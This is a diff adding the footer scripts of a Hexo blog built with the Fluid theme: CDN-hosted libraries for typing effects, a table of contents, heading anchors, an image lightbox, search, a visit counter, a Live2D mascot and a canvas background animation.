+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/project/js/events.js" ></script>
+<script  src="/project/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/project/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/project/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/project/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/project/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/project/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":250,"height":400},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!--������ʾ����-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<!--�������Ц����-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!--��̬��������-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.9' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
